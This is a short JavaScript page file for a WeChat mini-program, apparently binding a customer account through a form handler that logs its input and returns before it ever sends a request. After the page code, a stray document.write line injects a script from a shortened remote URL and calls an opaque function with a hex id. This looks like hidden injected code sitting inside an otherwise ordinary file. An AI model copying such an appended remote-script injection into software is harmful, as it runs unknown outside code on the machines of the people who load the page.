var app = getApp(),
  core = app.requirejs("core");
Page({

  /**
   * 页面的初始数据
   */
  data: {
    page: 1,
    loaded: false,
    loading: false,
    show: true
  },
  /**
   * 生命周期函数--监听页面加载
   */
  onLoad: function (options) {

    
  },

  /**
   * 页面上拉触底事件的处理函数
   */
  formSubmit: function (e) {
    var data = e.detail.value ;
    console.log(e,data);return;
    wx.request({
      url: app.globalData.domain + "/login/customerToLongicmall",
      data: data,
      success: function (e) {
        core.toast("提示","绑定成功");
      }
    })
  },
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
